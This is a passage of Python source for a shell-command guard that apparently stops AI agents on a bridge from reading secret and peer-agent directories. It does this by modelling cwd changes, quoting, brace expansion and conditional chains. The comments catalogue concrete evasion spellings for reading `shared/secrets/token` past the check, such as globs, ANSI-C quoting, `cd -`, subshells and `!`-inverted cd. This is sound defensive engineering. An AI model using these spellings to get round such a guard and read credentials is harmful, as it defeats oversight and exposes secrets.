# unlike a subshell) — `{ cd …; }`, `if cd …`, `for …; do cd …` (patch r6
# #11800). Stripped before locating the verb. A leading REGULAR command word
# (`echo cd /tmp`) is NOT in this set, so it is correctly left as a non-cd line.
_CWD_GROUP_OPENERS = frozenset({
    "{", "}", "if", "then", "else", "elif", "fi", "do", "done",
    "while", "until", "for", "case", "esac", "in", "!", "function", "(", ")",
})


def _segment_cwd_change(stripped: str) -> tuple[str, str | None] | None:
    """Classify a command segment's effect on the working directory by walking
    its shlex argv — bash wrapper/option/quote aware (codex r3 #11779, r4 #11787;
    patch #11780). Returns:
      ``("target", <dir>)`` — `cd`/`pushd <dir>` (first NON-option arg).
      ``("home", None)``   — a bare `cd` (no arg) → `$HOME`.
      ``("reset", None)``  — `popd` (pops the dir stack to a prior, unmodelable
        cwd → reset to UNKNOWN).
      ``None``             — not a cwd-changing command.

    Tokenizing via :func:`shlex.split` (posix) handles quote removal AND the
    ``\\cd`` / quoted-verb spellings for free, and lets us strip the non-forking
    wrappers (``command``/``builtin``/``time``) together with THEIR option
    grammar (``command -p cd``, ``command -- cd``, ``builtin -- cd``, ``time -p
    cd``) before locating the verb — so the whole static cd-grammar class is
    closed structurally rather than form by form."""
    try:
        toks = shlex.split(stripped, posix=True, comments=False)
    except ValueError:
        toks = stripped.split()
    i = 0
    # Strip, in any order, leading bash reserved words / group-openers (so a `cd`
    # hidden behind `{`/`if`/`for`/… is still located — its body runs in the
    # current shell, patch r6 #11800) AND the non-forking cd wrappers
    # (`command`/`builtin`/`time`) together with THEIR option grammar. NOTE:
    # `command -v`/`-V` (codex r5 #11794) are DESCRIBE/query modes that do NOT
    # execute the cd → no cwd change.
    while i < len(toks):
        if toks[i] in _CWD_GROUP_OPENERS:
            i += 1
            continue
        if toks[i] in _CWD_WRAPPER_WORDS:
            wrapper = toks[i]
            i += 1
            while i < len(toks) and toks[i].startswith("-") and toks[i] != "-":
                opt = toks[i]
                end_of_opts = opt == "--"
                if wrapper == "command" and not end_of_opts and ("v" in opt or "V" in opt):
                    return None  # `command -v/-V cd …` = describe, not execute
                i += 1
                if end_of_opts:
                    break
            continue
        break
    if i >= len(toks) or toks[i] not in ("cd", "pushd", "popd"):
        return None
    verb = toks[i]
    i += 1
    if verb == "popd":
        return ("reset", None)
    # First NON-option token after the verb is the directory.
    seen_ddash = False
    while i < len(toks):
        tok = toks[i]
        i += 1
        if not seen_ddash and tok == "--":
            seen_ddash = True
            continue
        if not seen_ddash and tok.startswith("-") and tok != "-":
            continue  # a `cd`/`pushd` option (-P / -L / -e / -@)
        if tok == "-":
            # `cd -` restores the PREVIOUS cwd (codex r5 #11794) — unmodelable in
            # a flat walk; reset to UNKNOWN. The scope-ambiguous fail-close in
            # `_forbidden_suffix_in_command` (it flags `cd -`) re-checks reads
            # against every prior cwd, so a restored bridge cwd is still caught.
            return ("reset", None)
        return ("target", tok)
    if verb == "cd":
        return ("home", None)  # bare `cd` → $HOME
    return None  # bare `pushd` (swaps the stack top — unmodelable, ignore)


def _apply_cwd_change(cwd: object, change: tuple[str, str | None]) -> object:
    """Apply one :func:`_segment_cwd_change` result to the running *cwd*,
    returning the new cwd (absolute normalized path / ``_CWD_UNKNOWN`` /
    ``_CWD_POISONED``)."""
    kind, target = change
    if kind == "reset":  # popd → previous (unmodelable) cwd
        return _CWD_UNKNOWN
    if kind == "home":  # bare `cd` → $HOME
        home = os.path.expanduser("~")
        return os.path.normpath(home) if os.path.isabs(home) else _CWD_UNKNOWN
    # kind == "target"
    expanded = _expand_bridge_prefixes(target or "")
    if "$" in expanded:
        return _CWD_POISONED  # unresolved $var cd-target → bridge-suspect
    if os.path.isabs(expanded):
        return os.path.normpath(expanded)
    if cwd is _CWD_POISONED:
        return _CWD_POISONED  # relative move under a poisoned cwd stays poisoned
    if isinstance(cwd, str):
        return os.path.normpath(os.path.join(cwd, expanded))
    return _CWD_UNKNOWN  # relative cd with no known base


def _ansic_decoded_segment(seg: str) -> str | None:
    """Return *seg* with each ANSI-C ``$'…'`` span replaced by the literal bytes
    bash produces, or ``None`` when the segment has no ``$'``. ``shlex.split``
    treats ``$'secrets'`` as ``$`` + a single-quoted ``secrets`` and yields the
    word ``$secrets`` — losing the decoded literal that bash actually reads
    (codex #11827 r11). Decoding the ``$'…'`` span at the SEGMENT level first,
    then re-tokenizing, surfaces the real path word (``secrets``) for the
    resolution scan. Decode failure leaves the span literal (still fail-closed by
    the obfuscation pass)."""
    if "$'" not in seg:
        return None

    def _lit(match: re.Match) -> str:
        body = match.group(1)
        try:
            return body.encode("latin-1", "backslashreplace").decode("unicode_escape")
        except Exception:  # noqa: BLE001 — decode failure → leave the span literal
            return match.group(0)

    return _ANSIC_RE.sub(_lit, seg)


def _unquoted_comma_split(body: str) -> list[str] | None:
    """Split a brace *body* on its top-level UNQUOTED commas (respecting ``'``,
    ``"``, and ``\\`` — bash does not treat a quoted/escaped comma as an
    alternative separator). Returns the parts iff at least one unquoted comma was
    seen (empty members allowed: ``r,`` → ``['r', '']``), else ``None``."""
    parts: list[str] = []
    cur: list[str] = []
    quote: str | None = None
    esc = False
    saw = False
    for ch in body:
        if esc:
            cur.append(ch)
            esc = False
            continue
        if ch == "\\" and quote != "'":
            cur.append(ch)
            esc = True
            continue
        if quote:
            cur.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in ("'", '"'):
            cur.append(ch)
            quote = ch
            continue
        if ch == ",":
            saw = True
            parts.append("".join(cur))
            cur = []
            continue
        cur.append(ch)
    parts.append("".join(cur))
    return parts if saw else None


def _brace_alternatives(body: str) -> list[str] | None:
    """The bash brace-expansion alternatives of an INNERMOST ``{body}`` (no
    nested unquoted ``{``): a top-level unquoted comma list, an integer range
    ``m..n[..step]``, or a single-char range ``a..z``. Returns ``None`` when
    *body* is not an expandable brace (a plain ``{foo}`` bash leaves literal)."""
    parts = _unquoted_comma_split(body)
    if parts is not None:
        return parts
    m = re.fullmatch(r"(-?\d+)\.\.(-?\d+)(?:\.\.(-?\d+))?", body)
    if m:
        lo, hi = int(m.group(1)), int(m.group(2))
        step = abs(int(m.group(3))) if m.group(3) else 1
        if step == 0:
            step = 1
        rng = range(lo, hi + 1, step) if lo <= hi else range(lo, hi - 1, -step)
        # Bound generation ABOVE the segment-expansion cap (1024) — slicing a
        # range is O(1) so `{0..10000000}` never builds millions — so an
        # over-cap range still overflows `_brace_expand_segment` and is signalled
        # as truncated there (codex #11845 r15) rather than silently shortened.
        return [str(x) for x in rng[:2048]]
    m = re.fullmatch(r"([A-Za-z])\.\.([A-Za-z])", body)
    if m:
        lo, hi = ord(m.group(1)), ord(m.group(2))
        seq = range(lo, hi + 1) if lo <= hi else range(lo, hi - 1, -1)
        return [chr(x) for x in seq[:2048]]
    return None


def _find_unquoted_innermost_brace(s: str):
    """Return ``(start, close, alternatives)`` for the leftmost INNERMOST
    expandable ``{…}`` in *s*, or ``None``. QUOTE-AWARE (codex #11845 r14): a
    ``{``/``,``/``}`` inside ``'…'`` / ``"…"`` or after a ``\\`` is literal — bash
    does not brace-expand quoted/escaped braces — and a ``${…}`` parameter
    expansion is skipped. *start*..*close* index the ``{``..``}``."""
    quote: str | None = None
    esc = False
    last_open: int | None = None
    for idx, ch in enumerate(s):
        if esc:
            esc = False
            continue
        if ch == "\\" and quote != "'":
            esc = True
            continue
        if quote:
            if ch == quote:
                quote = None
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        if ch == "{" and not (idx > 0 and s[idx - 1] == "$"):
            last_open = idx
        elif ch == "}" and last_open is not None:
            alts = _brace_alternatives(s[last_open + 1:idx])
            if alts is not None:
                return (last_open, idx, alts)
            last_open = None
    return None


def _brace_expand_segment(s: str, cap: int = 1024) -> tuple[list[str], bool]:
    """Statically expand bash brace alternation/ranges in the raw segment *s*
    (BEFORE quote removal, so quoted/escaped braces are NOT expanded — codex
    #11845 r14 Finding 2), returning ``(expansions, truncated)``. ``truncated``
    is ``True`` when the cap or the depth bound is hit so a forbidden member
    could lie past the inspected set — the caller fail-closes a bridge-relevant
    truncation (codex #11845 / patch #11846 r14 Finding 1) rather than silently
    dropping it."""
    if "{" not in s:
        return [s], False
    out = [s]
    truncated = False
    for _ in range(24):  # depth bound (nested / sequential braces)
        nxt: list[str] = []
        expanded = False
        for w in out:
            found = _find_unquoted_innermost_brace(w)
            if found is None:
                nxt.append(w)
                continue
            expanded = True
            start, close, alts = found
            pre, post = w[:start], w[close + 1:]
            for alt in alts:
                nxt.append(pre + alt + post)
                if len(nxt) >= cap:
                    truncated = True
                    break
            if truncated:
                break
        out = nxt
        if not expanded:
            break
        if truncated:
            break
    else:
        # Loop ran the full depth bound with braces possibly remaining.
        if any(_find_unquoted_innermost_brace(w) is not None for w in out):
            truncated = True
    return out, truncated


def _brace_truncation_bridge_relevant(
    seg: str,
    read_cwds: list[object],
    forbidden_dirs: list[tuple[str, str]],
) -> bool:
    """True iff a brace-expansion truncation in *seg* is BRIDGE-RELEVANT and must
    fail closed (codex #11845 / patch #11846 r14): the segment is bridge-anchored,
    OR the read runs under a cwd that is INSIDE the bridge home (a hidden post-cap
    member — a short relative tail or a ``..`` climb — could resolve into a
    forbidden subtree there). A truncation off the bridge (``echo {1..100000}``,
    or under ``/tmp``) is NOT relevant → not over-blocked. *forbidden_dirs* is
    unused but kept for call-site symmetry."""
    del forbidden_dirs  # relevance is bridge-home containment, not a specific dir
    if any(anchor in seg for anchor in _bridge_anchor_tokens()):
        return True
    try:
        home = str(bridge_home_dir())
    except Exception:  # noqa: BLE001
        return False
    for c in read_cwds:
        if not isinstance(c, str) or c is _CWD_POISONED:
            continue
        if c == home or c.startswith(home + os.sep):
            return True
    return False


def _segment_candidate_words(seg: str) -> tuple[list[str], bool]:
    """Return ``(fragments, brace_truncated)`` — the path-candidate words of a
    SINGLE shell *seg*, plus whether a brace expansion overflowed the cap.

    Each variant (the raw segment, and — when it carries ANSI-C ``$'…'`` quoting
    — the ANSI-C-decoded segment, codex #11827 r11) is brace-expanded QUOTE-AWARE
    at the segment level (codex #11837 r13 / #11845 r14), THEN ``shlex``-tokenized
    with bash quote-removal (a malformed segment falls back to a raw split; the
    caller fail-closes a bridge-anchored unparseable command separately).
    ``shlex`` mangles ``$'secrets'`` → ``$secrets`` and removes quotes, so brace
    expansion MUST precede it to avoid both hiding a decoded path and expanding a
    quoted brace bash would leave literal."""
    variants = [seg]
    decoded_seg = _ansic_decoded_segment(seg)
    if decoded_seg is not None:
        variants.append(decoded_seg)
    fragments: list[str] = []
    truncated = False
    for variant in variants:
        expansions, trunc = _brace_expand_segment(variant)
        truncated = truncated or trunc
        for expansion in expansions:
            try:
                tokens = shlex.split(expansion, posix=True, comments=False)
            except ValueError:
                tokens = expansion.split()
            for token in tokens:
                for fragment in _alias_path_fragments(token):
                    fragments.append(fragment)
    return fragments, truncated


def _command_effective_cwd(segments: list[str]) -> object:
    """Fold the literal ``cd``/``pushd`` targets across the command *segments*
    (already split on ``;`` / ``&&`` / ``||`` / ``|`` / ``(`` / ``)``) into an
    effective cwd, returning an ABSOLUTE normalized path, ``_CWD_UNKNOWN`` (the
    agent's real cwd — unanchorable), or ``_CWD_POISONED`` (a bridge-suspect
    ``cd`` into an unresolved expression).

    Rules (issue #1709 r3):
      - ``cd <abs>`` where the target expands to a concrete absolute path
        (``$HOME``/``${HOME}``/``~``/``$BRIDGE_HOME``/``${BRIDGE_HOME}``/literal
        abs) → eff_cwd = ``normpath(<abs>)``.
      - ``cd <rel>`` when eff_cwd is a known absolute path →
        eff_cwd = ``normpath(join(eff_cwd, <rel>))`` (folds ``..`` / ``.``).
      - ``cd <rel>`` when eff_cwd is UNKNOWN → stays UNKNOWN (can't anchor a
        relative move with no base — it is relative to the agent's own cwd).
      - ``cd <expr>`` that still carries an unresolved ``$var`` after
        bridge-prefix expansion → POISONED (could be the bridge home; a later
        relative forbidden read under it fails closed).
    The cwd does NOT change for segments without a leading ``cd``/``pushd``.
    """
    eff: object = _CWD_UNKNOWN
    for seg in segments:
        change = _segment_cwd_change(seg.strip())
        if change is not None:
            eff = _apply_cwd_change(eff, change)
    return eff


def _resolved_forbidden_hit(
    word: str,
    eff_cwd: object,
    forbidden_dirs: list[tuple[str, str]],
) -> str | None:
    """Resolve a single read-candidate *word* against the effective cwd and
    return the matched forbidden SUFFIX (for the deny reason) iff the resolved
    absolute path lands inside a forbidden tree, else ``None``.

    *forbidden_dirs* is a list of ``(abs_dir, suffix)`` — the absolute
    forbidden directory under the bridge home and its display suffix.

    Resolution mirrors the kernel for the static-path class:
      - decode the bash literals already handled (ANSI-C ``$'…'``, ordinary
        backslash ``\\X``→``X``) so an encoded separator/segment surfaces;
      - expand the bridge-known prefixes (``~``/``$HOME``/``$BRIDGE_HOME`` …);
      - ABSOLUTE after expansion → ``normpath(word)`` (folds ``..``/``//``/``.``);
      - RELATIVE + known eff_cwd → ``normpath(join(eff_cwd, word))``;
      - RELATIVE + UNKNOWN eff_cwd → unanchorable (relative to the agent's own
        cwd) → ``None`` (do NOT over-block);
      - RELATIVE + POISONED eff_cwd → see :func:`_forbidden_suffix_in_command`
        fail-close (handled by the caller, not here).
    A surviving ``$var`` after expansion is unresolved → ``None`` here; the
    caller's Pass-2 obfuscation fail-close decides it.
    """
    decoded = _decode_obfuscated_word(word)
    expanded = _expand_bridge_prefixes(decoded)
    if "$" in expanded:
        return None  # unresolved $var → caller's fail-close path decides
    if os.path.isabs(expanded):
        resolved = os.path.normpath(expanded)
    elif isinstance(eff_cwd, str) and eff_cwd is not _CWD_POISONED:
        resolved = os.path.normpath(os.path.join(eff_cwd, expanded))
    else:
        return None  # relative + unknown/poisoned base → not resolvable here
    for abs_dir, suffix in forbidden_dirs:
        if resolved == abs_dir or resolved.startswith(abs_dir + os.sep):
            return suffix
    return None


def _forbidden_dirs_for_suffixes(suffixes: list[str]) -> list[tuple[str, str]]:
    """Map each forbidden *suffix* (``/shared/secrets``, ``/agents/<name>``,
    ``/agents/<name>/home``) to its absolute directory, returning
    ``(abs_dir, suffix)`` pairs. Derived from the SAME SSOTs as the suffix
    lists, so the resolved containment check can never drift from the spelling
    scan it replaces.

    Issue #1823: a v2 peer-home suffix (``/agents/<name>/home``) resolves under
    the v2 data root (``agent_root_v2()`` = ``$BRIDGE_DATA_ROOT/agents``), which
    may NOT sit under the operator bridge home — so a plain ``bridge_home +
    suffix`` join would compute the WRONG absolute dir and the resolved-path
    containment pass would miss a real v2 peer-home write. We therefore emit the
    abs dir under BOTH anchors for a v2-home suffix: the real v2 location AND
    the bridge-home join (harmless when they coincide; the latter also keeps the
    legacy spelling working on installs where the v2 tree mirrors under the
    bridge home). Both share the SAME display suffix.
    """
    try:
        home = str(bridge_home_dir())
    except Exception:  # noqa: BLE001
        home = ""
    # `agent_root_v2()` is `<data_root>/agents`; its parent is `<data_root>`,
    # under which a `/agents/<name>/home` suffix resolves to the real v2 home.
    v2_anchor = ""
    try:
        root_v2 = agent_root_v2()
        if root_v2 is not None:
            v2_anchor = str(root_v2.parent)
    except Exception:  # noqa: BLE001
        v2_anchor = ""
    out: list[tuple[str, str]] = []
    for suffix in suffixes:
        if home:
            out.append((os.path.normpath(home + suffix), suffix))
        # Resolve the v2 peer-home suffix under the real data root too.
        if v2_anchor and suffix.startswith("/agents/") and suffix.endswith("/home"):
            v2_dir = os.path.normpath(v2_anchor + suffix)
            if not any(existing == v2_dir for existing, _s in out):
                out.append((v2_dir, suffix))
    return out


def _relative_word_under_poison(
    word: str,
    forbidden_dirs: list[tuple[str, str]],
) -> str | None:
    """For a POISONED eff_cwd (a ``cd`` into an unresolved bridge-suspect
    ``$var``), a RELATIVE read whose folded path STARTS WITH a forbidden tail
    could resolve into the secret tree at runtime → fail closed. Returns the
    matched suffix iff *word* is relative and ``normpath(word)`` is — or sits
    under — a forbidden tail (``shared/secrets/…``, ``agents/<name>/…``), else
    ``None`` (an absolute word is judged by :func:`_resolved_forbidden_hit`; a
    relative word that does not name a forbidden tail is the agent's own cwd
    business). The match is anchored at the START of the folded relative path —
    a ``cd $UNKNOWN`` could place the cwd at the bridge home, so
    ``shared/secrets/token`` read from there reaches the secret tree, but a
    ``logs/shared/secrets``-shaped tail elsewhere does not.
    """
    decoded = _decode_obfuscated_word(word)
    expanded = _expand_bridge_prefixes(decoded)
    if "$" in expanded or os.path.isabs(expanded):
        return None
    folded = os.path.normpath(expanded)
    for _abs_dir, suffix in forbidden_dirs:
        rel = suffix.lstrip("/")
        if folded == rel or folded.startswith(rel + "/"):
            return suffix
    return None


_PAREN_SPLIT_RE = re.compile(r"[()]")


def _literal_truth(seg: str) -> bool | None:
    """The statically-known exit truth of command *seg* iff it is the literal
    ``true``/``:`` (→ True) or ``false`` (→ False) builtin (with optional leading
    ``!`` negations), else ``None`` (unknown exit). Used to decide whether a
    following ``&&``/``||``-conditional ``cd`` is PROVABLY skipped (codex r7
    #11805): only ``&&`` after a literal-false, or ``||`` after a literal-true,
    guarantees the skip; any other conditional ``cd`` MAY execute."""
    try:
        toks = shlex.split(seg.strip(), posix=True, comments=False)
    except ValueError:
        return None
    neg = False
    while toks and toks[0] == "!":
        neg = not neg
        toks.pop(0)
    if not toks:
        return None
    if toks[0] in ("true", ":"):
        base = True
    elif toks[0] == "false":
        base = False
    else:
        return None
    return (not base) if neg else base


def _segment_exit(seg: str) -> object:
    """The bounded-chain exit model of command *seg* for the ``&&``/``||``
    evaluator (codex r9 #11815). Returns:

    - ``_CD_LIKELY_SUCCESS`` for a ``cd``/``pushd``/``popd`` command — it almost
      always succeeds (so an ``&&`` continuation runs), but CAN fail (so a
      following ``||`` MAY run);
    - ``True`` / ``False`` for the literal ``true``/``:`` / ``false`` builtins
      (with leading ``!`` negation), per :func:`_literal_truth`;
    - ``None`` otherwise (unknown exit).

    Modeling a successful ``cd`` is what lets ``cd $BH/shared && cd /tmp &&
    read`` commit the cd-OUT cwd: in an all-``&&`` chain the read only runs if
    EVERY preceding ``cd`` succeeded, so the read's cwd is precisely the last
    ``cd`` target — not the prior bridge cwd. A ``cd`` whose own execution is
    uncertain (a ``union`` disposition) never reaches here, so the sentinel is
    only ever produced for a ``cd`` that definitely ran.

    A leading ``!`` INVERTS the cd's exit (patch #11838 r12): ``! cd <out>``
    exits 0 — continuing an ``&&`` chain — EXACTLY when the cd FAILS, i.e. when
    bash stays in the prior (forbidden) cwd. So an ODD ``!`` count must NOT model
    likely-success: return ``None`` (unknown), which de-gates the downstream read
    (``gated=False``) so the prior cwd in ``chain_cwds`` is re-checked → DENY.
    Even count keeps likely-success (``! ! cd`` = cd-success semantics). Mirrors
    the ``!``-parity :func:`_literal_truth` already applies to ``true``/``:``."""
    stripped = seg.strip()
    if _segment_cwd_change(stripped) is not None:
        try:
            toks = shlex.split(stripped, posix=True, comments=False)
        except ValueError:
            toks = stripped.split()
        neg = False
        for tok in toks:
            if tok == "!":
                neg = not neg
            else:
                break
        return None if neg else _CD_LIKELY_SUCCESS
    return _literal_truth(seg)


def _forbidden_suffix_in_command(text: str, suffixes: list[str]) -> str | None:
    """Scan the shell command *text* for a read that RESOLVES into any
    forbidden tree, independent of how the path is spelled or traversed.

    Returns the matched forbidden suffix (for the deny reason) or ``None``.

    Path-MODELING (issue #1709 r3), two passes, fail-closed:

    1. Resolved-path containment. Fold the literal ``cd``/``pushd`` targets
       into an effective cwd, then for each read-candidate word expand the
       bridge-known prefixes (``~``/``$HOME``/``$BRIDGE_HOME`` …), decode the
       bash literals (ANSI-C ``$'…'``, backslash ``\\X``→``X``), join under
       the eff_cwd if relative, ``os.path.normpath`` (folding ``..``/``//``/
       ``/./``), and DENY when the resolved absolute path is — or sits under —
       a forbidden directory. This closes ``..`` parent-traversal, accumulated
       ``cd`` depth, multi-``cd``, and every separator/dot-segment spelling in
       one sound check (replacing the r1/r2 literal-suffix text scan that
       could not model resolution). A relative word with an UNKNOWN eff_cwd is
       NOT over-blocked (it is relative to the agent's own cwd). A relative
       word under a POISONED eff_cwd (a ``cd`` into an unresolved bridge-suspect
       ``$var``) whose tail names a forbidden suffix fails closed.

    2. Obfuscation fail-close (unchanged r2 model). A word carrying a glob
       (``* ? [ ]``), command-sub (``$(…)``/backtick), or a surviving ``$var``
       the decode could not resolve cannot be statically modeled. We deny it
       iff it is bridge-anchored AND its literal prefix-before-the-glob could
       select a forbidden directory, so ``cat ${HOME}/.agent-bridge/shared/
       sec*ets/token`` fails closed while a benign repo ``./agents/*.md`` (no
       bridge anchor) is not collateral-damaged.
    """
    # Split into shell segments on `;`, `&&`, `||`, `|`, `&`, newline, and the
    # subshell parens `(` `)`. Track whether each segment is CONDITIONAL — gated
    # by a preceding `&&`/`||` on a prior command's exit (codex r6 #11799): bash
    # may SKIP such a `cd`, so a conditional `cd` must NOT advance the modeled
    # cwd (a skipped `cd out` leaves bash inside the tree; a skipped `cd in`
    # never enters it). Reads in a conditional segment are still scanned (they
    # may execute and leak). Split with the operators captured so the preceding
    # operator of each segment is known.
    # Disposition of each segment's `cd` under `&&`/`||` conditional execution
    # (codex r6 #11799 / r7 #11805, patch r7 #11806):
    #   "skip"  — provably NOT executed (`&&` after literal-false, `||` after
    #             literal-true) → no cwd effect.
    #   "exec"  — unconditional, or provably executed (`&&` after literal-true,
    #             `||` after literal-false) → advance the linear cwd precisely.
    #   "union" — genuinely ambiguous conditional (non-literal prior) → the cd
    #             MAY run, so model BOTH branches: record its target in
    #             `cwds_seen` + force the scope-ambiguous read check, but do NOT
    #             commit the linear cwd (the skip branch keeps the prior cwd).
    # Evaluate the `&&`/`||` chain left-to-right with SHORT-CIRCUIT semantics
    # (patch r8 #11806): a segment's `cd` execution depends on the running exit
    # status of the WHOLE chain, not just the immediate predecessor. `false &&
    # true || cd …` runs the cd (false&&true short-circuits to false → ||cd
    # runs). `running` is the chain's exit so far, reset at `;`/`&`/`|`/newline.
    # Exit states: True / False (literal builtins), None (unknown), and
    # `_CD_LIKELY_SUCCESS` for an executed `cd`/`pushd`/`popd` (codex r9 #11815)
    # — a cd almost always succeeds so `&&` after it CONTINUES the chain (commit
    # the cd-OUT cwd: in an all-`&&` chain the read only runs if every preceding
    # cd succeeded → cwd is the last cd target), but it CAN fail so `||` after it
    # is genuinely ambiguous (union → keeps `cd <missing> || cd <bridge>` sound).
    # The bounded grammar (true/false/:/! + cd-success + &&/||) converges.
    seg_specs: list[tuple[str, bool, bool, str]] = []
    prev_op: str | None = None
    running: object = None
    chain_start = True
    for part in re.split(r"(&&|\|\||\||;|&|\n)", text):
        if part in ("&&", "||", "|", ";", "&", "\n"):
            prev_op = part
            if part not in ("&&", "||"):
                chain_start = True  # `;`/`&`/`|`/newline end the conditional chain
                running = None
            continue
        runs: bool | None
        if chain_start:
            runs = True
        elif prev_op == "&&":
            # Continues iff the chain so far succeeded. A cd is likely-success.
            if running is False:
                runs = False
            elif running is None:
                runs = None
            else:  # True or _CD_LIKELY_SUCCESS
                runs = True
        elif prev_op == "||":
            # Runs iff the chain so far FAILED. A cd usually succeeds (|| skips)
            # but MAY fail (|| runs) → genuinely ambiguous → union.
            if running is True:
                runs = False
            elif running is False:
                runs = True
            else:  # None or _CD_LIKELY_SUCCESS
                runs = None
        else:
            runs = True
        disp = "exec" if runs is True else ("skip" if runs is False else "union")
        # `&&`-GATED reachability (codex #11822 / patch #11823 r10): a segment
        # reached via `&&` from a truthy/cd-success exit runs ONLY if every
        # preceding cd succeeded, so the cd-FAILURE branch cannot reach it — its
        # cwd is exactly the committed linear cwd, and it must NOT be re-checked
        # against the prior (fail-branch) cwds. A non-gated read (chain start
        # after `;`/`&`/`|`/newline, or a `||` failure side) CAN run after a cd
        # failed, so it is re-checked against the prior cwd. `running` here is
        # still the predecessor's exit (advanced below).
        gated = (
            not chain_start
            and prev_op == "&&"
            and (running is True or running is _CD_LIKELY_SUCCESS)
        )
        # Mark the FIRST sub of a hard-break-started chain so the walk can promote
        # the prior chain's fail-branch cwds to sticky (patch #11823 r11).
        for idx, sub in enumerate(_PAREN_SPLIT_RE.split(part)):
            seg_specs.append((disp, gated, chain_start and idx == 0, sub))
        # Advance the running exit status for the next chained segment.
        if runs is True:
            running = _segment_exit(part)  # cd→likely-success, true/false→bool, …
        elif runs is None:
            running = None  # maybe-ran / unknown exit
        # runs is False → short-circuited, running unchanged.
        chain_start = False

    forbidden_dirs = _forbidden_dirs_for_suffixes(suffixes)

    # Fail-close a genuinely unbalanced-quote (unparseable) COMMAND that is
    # bridge-anchored: shlex cannot recover its real argv, so a forbidden read
    # could hide behind the malformed quoting (patch r3 #11780, consistent with
    # the bash-argv ValueError→deny stance). Checked on the WHOLE text — a legit
    # `awk -F'|' … <bridge-path>` has balanced quotes overall but the operator
    # split tears `-F'|'` at the `|` into spurious unbalanced pieces, so a
    # per-segment check would over-block it. A non-bridge-anchored unparseable
    # command is not our concern.
    if any(anchor in text for anchor in _bridge_anchor_tokens()):
        try:
            shlex.split(text, posix=True, comments=False)
        except ValueError:
            return _OBFUSCATED_SUFFIX_SENTINEL

    # Control-flow SCOPE the flat positional walk cannot model precisely: a
    # subshell `( … )` whose cwd change bash discards at `)`, a `pushd`/`popd`
    # dirstack, and `cd -` (restore previous cwd). When such a construct appears
    # in a bridge-anchored command, a relative read can resolve into a forbidden
    # tree under a cwd a PRIOR `cd` established but control-flow restored. We
    # fail-close (patch r5 #11795 / codex r5 #11794): resolve each relative read
    # against EVERY cwd entered earlier in the walk, not just the linear current
    # one. (Gated on the scope-ambiguous construct so a plain `cd in; cd out;
    # read` is NOT over-blocked — that read is genuinely in the out cwd.)
    # Loose bridge-presence (NOT the trailing-slash `_bridge_anchor_tokens` — a
    # `cd $BRIDGE_HOME;` target has no trailing slash): the scope fail-close only
    # ever DENIES a read that resolves into a forbidden dir, so a broad trigger
    # cannot over-block.
    bridge_mentioned = (
        "$BRIDGE_HOME" in text
        or "${BRIDGE_HOME}" in text
        or "/.agent-bridge" in text
        or str(bridge_home_dir()) in text
    )
    scope_ambiguous = bridge_mentioned and (
        "(" in text
        or ")" in text
        or re.search(r"(?:^|[;&|()\s])(?:pushd|popd)\b", text) is not None
        or re.search(r"(?:^|[;&|()\s])\\?cd\s+-(?:[\s;&|)]|$)", text) is not None
    )

    # POSITIONAL cwd walk (patch r4 #11788): resolve THIS segment's read words
    # against the CURRENT cwd, THEN apply this segment's cd change. A read sees
    # only the `cd`s that PRECEDE it, so a trailing `cd`/`popd` back out of the
    # forbidden tree can no longer un-anchor an earlier forbidden read
    # (`cd $BH/shared && cat secrets/token && cd /tmp`).
    cwd: object = _CWD_UNKNOWN
    # A cd-out can FAIL, leaving bash in the PRIOR cwd. Track those fail-branch
    # cwds in two tiers (codex #11822 / patch #11823 r11):
    #   sticky_cwds — the read may run there regardless of its local `&&` gate
    #     (a fail-branch from a PRIOR chain, reached unconditionally after a
    #     `;`/`&`/`|`/newline) → re-checked for EVERY read.
    #   chain_cwds  — a fail-branch from the CURRENT chain → re-checked only for
    #     a NON-`&&`-gated read, because a gated read short-circuits on the very
    #     cd that created it (keeps codex r9's `cd $BH/shared && cd /tmp && read`
    #     ALLOW). Promoted to sticky at the next hard-break boundary.
    sticky_cwds: list[str] = []
    chain_cwds: list[str] = []
    for disp, gated, seg_chain_start, seg in seg_specs:
        # Hard break before this segment → the prior chain's cd-failure branches
        # are now reachable by the (unconditionally-run) read, even if it is
        # `&&`-gated on a fresh literal-true. Promote them (patch #11823 r11):
        # `cd $BH/shared && cd /nx; true && cat secrets` must DENY.
        if seg_chain_start and chain_cwds:
            sticky_cwds.extend(chain_cwds)
            chain_cwds = []

        words, brace_truncated = _segment_candidate_words(seg)
        # The cwds this read may actually run in: the linear (all-success) cwd,
        # every sticky fail-branch (always), and the current chain's fail-branches
        # unless this read is `&&`-gated. `scope_ambiguous` (subshell/pushd/cd-)
        # forces the chain set on too (those constructs restore a prior cwd the
        # linear walk cannot model).
        read_cwds: list[object] = [cwd]
        read_cwds.extend(sticky_cwds)
        if (not gated) or scope_ambiguous:
            read_cwds.extend(chain_cwds)

        # A brace expansion that overflowed the cap cannot be fully inspected, so
        # a forbidden member could lie past the truncation (codex #11845 / patch
        # #11846 r14). Fail closed when bridge-RELEVANT — the segment is
        # bridge-anchored, or the read runs under a cwd that CONTAINS a forbidden
        # subtree — so `echo {1..100000}` off the bridge stays ALLOW.
        if brace_truncated and _brace_truncation_bridge_relevant(
            seg, read_cwds, forbidden_dirs
        ):
            return _OBFUSCATED_SUFFIX_SENTINEL

        for raw_word in words:
            # Pass 1 — resolved-path containment against every cwd this read may
            # run in.
            for c in read_cwds:
                hit = _resolved_forbidden_hit(raw_word, c, forbidden_dirs)
                if hit is not None:
                    return hit
            # Relative read under a POISONED (bridge-suspect `$var`) cwd whose
            # tail names a forbidden suffix → fail closed.
            if cwd is _CWD_POISONED:
                poison_hit = _relative_word_under_poison(raw_word, forbidden_dirs)
                if poison_hit is not None:
                    return poison_hit

            # Pass 2 — obfuscation fail-close (ANSI-C / glob / cmd-sub / backslash)
            # against the SAME cwd set, not only the current linear cwd (codex
            # #11827 r11: `cd $BH/shared && cat $'secrets'/token` and `… sec*ets/
            # token` resolve under the bridge cwd but the raw word has no bridge
            # anchor). ANSI-C `$'…'` reaching here as a candidate is already
            # segment-decoded by `_segment_candidate_words`; this is the residual
            # backslash/glob/cmd-sub fail-close.
            if not _word_carries_obfuscation(raw_word):
                continue
            # 2a. Decode ANSI-C `$'…'` / backslash and re-resolve against each cwd.
            if _decode_obfuscated_word(raw_word) != raw_word:
                for c in read_cwds:
                    if _resolved_forbidden_hit(raw_word, c, forbidden_dirs) is not None:
                        return _OBFUSCATED_SUFFIX_SENTINEL
            # 2b. Glob / command-sub fail-close: the literal prefix-before-the-glob
